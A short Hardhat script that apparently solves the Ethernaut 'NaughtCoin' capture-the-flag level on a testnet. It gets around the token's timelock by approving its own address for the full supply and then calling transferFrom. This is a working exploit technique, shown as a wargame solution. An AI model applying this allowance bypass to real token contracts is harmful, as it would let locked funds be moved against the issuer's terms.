import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // naught coin address
    let address_a = "0x9C1607518e30B50031cFe4836403884aAAfd3aa0";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("NaughtCoin", address_a, signer);

    // give approval to self to transfer token and call transferFrom, to bypass timelock
    let supply = await contract_a.INITIAL_SUPPLY();
    let tx = await contract_a.increaseAllowance(player,supply);
    tx.wait();
    await contract_a.transferFrom(player,address_a,supply);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
